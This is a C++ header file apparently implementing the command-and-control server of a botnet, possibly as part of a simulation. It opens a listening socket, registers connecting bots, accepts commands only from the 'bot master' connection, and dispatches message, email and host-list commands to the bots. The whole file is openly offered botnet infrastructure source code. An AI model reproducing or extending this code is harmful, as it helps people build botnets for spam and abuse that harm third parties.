#ifndef CNCSERVER_H
#define	CNCSERVER_H


#include <iostream>
#include <fstream>
#include <cstdlib>
#include <cstdlib>
#include <cstring>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <iostream>
#include <fstream>
#include <sys/time.h>
#include  <signal.h>
#include <list>
#include "ProcessDetails.h"

using namespace std;


extern void SIGINT_handler(int sig);
extern string gettimeinbuffer(timeval time_val);

class CNCServer
{
private:
    string cnc_configuration_file;
    char temp[1024];
    ProcessDetails * processDetails;
    int processCount;
    string master_authentication_key, cnc_output_filename;
    int cnc_listening_port;
    int total_communicators;
    ofstream outputFileHandler;
    ProcessDetails botMaster;
    timeval base_signal;
    bool LoadConfigurations();
    bool OpenOutputFileHandler();
    void HostHangUp(int hostPort);
    void ExecuteGetListOfHosts(char *command);
    void ExecuteMessage(char *command);
    void ExecuteEmail(char * command);
    void RegisterHost(char *message, int sockfd);
    void LogMessage(char * message);
public:
    void set_cnc_configuration_file(string filename)
    {
        cnc_configuration_file.assign(filename);
    }
    int Start()
    {
        //cnc code goes here
        signal(SIGUSR1, SIGINT_handler);
        //load configurations from configuration file
        if (!LoadConfigurations())
        {
            perror("cnc configuration file not found");
            return -1;
        }

        if (!OpenOutputFileHandler()){
            perror("cannot create C&C server output file");
        }
        
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "cnc_listening_port: %d", cnc_listening_port);
        LogMessage(temp);
        
        processDetails = new ProcessDetails[total_communicators];
        processCount = 0;
        fd_set master;
        fd_set read_fds;
        struct sockaddr_in myaddr;
        struct sockaddr_in remoteaddr;
        int fdmax;
        int listener;
        int newfd;
        int nbytes;
        botMaster.portAssociated = 0; botMaster.status = OFF;
        socklen_t addrlen;
        int i, j;
        FD_ZERO(&master);
        FD_ZERO(&read_fds);
        if ((listener = socket(PF_INET, SOCK_STREAM, 0)) == -1)
        {
            perror("socket");
            exit(1);
        }
        myaddr.sin_family = AF_INET;
        myaddr.sin_addr.s_addr = INADDR_ANY;
        myaddr.sin_port = htons(cnc_listening_port);
        memset(myaddr.sin_zero, '\0', sizeof myaddr.sin_zero);
        if (bind(listener, (struct sockaddr *)&myaddr, sizeof myaddr) == -1)
        {
            perror("bind");
            exit(1);
        }
        if (listen(listener, total_communicators) == -1)
        {
            perror("listen");
            exit(1);
        }
        FD_SET(listener, &master);
        fdmax = listener;

        //waiting for the base signal from god process
        sleep(100);
        gettimeofday(&base_signal, 0);

        while (true) {
            read_fds = master;
            if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1)
            {
                perror("select");
                exit(1);
            }
            for(i = 0; i <= fdmax; i++) {
                if (FD_ISSET(i, &read_fds)) {
                    if (i == listener) {
                        addrlen = sizeof remoteaddr;
                        if ((newfd = accept(listener, (struct sockaddr *)&remoteaddr, &addrlen)) == -1)
                        {
                            perror("accept");
                        }
                        else
                        {
                            FD_SET(newfd, &master);
                            if (newfd > fdmax)
                            {
                                fdmax = newfd;
                            }
                        }
                    }
                    else
                    {
                        memset(temp, 0, sizeof(temp));
                        if ((nbytes = recv(i, temp, sizeof(temp), 0)) <= 0)
                        {
                            if (nbytes == 0)
                            {
                                //HANG UP HOST
                                HostHangUp(i);
                            }
                            else
                            {
                                perror("recv");
                            }
                            close(i);
                            FD_CLR(i, &master);
                        }
                        else
                        {
                            if (strncmp(temp, "name:", 4)==0)
                            {
                                //registering  host
                                RegisterHost(temp, i);
                            }
                            else
                            {
                                //some command received
                                if (i!=botMaster.portAssociated)
                                {
                                    cout<<"Attempt to Hi-Jack our botnet was prevented"<<endl;
                                    continue;
                                }
                                if (strncmp(temp, "<Message>", 9)==0)
                                {
                                    //execute message sending command
                                    ExecuteMessage(temp);
                                }
                                else if (strncmp(temp, "<Email>", 6)==0)
                                {
                                    //execute email command
                                    ExecuteEmail(temp);
                                }
                                else if (strncmp(temp, "<get_list_of_connected_hosts>", 29)==0)
                                {
                                    //send list of bots to bot master
                                    ExecuteGetListOfHosts(temp);
                                }
                                else
                                {
                                    //all types of unhandled messages will reach here
                                    cout<<"All unhandled messages should reach here"<<endl;
                                }
                            }
                        }
                    }
                }
            }
        }
        return 0; 
    }
};

#endif	/* CNCSERVER_H */

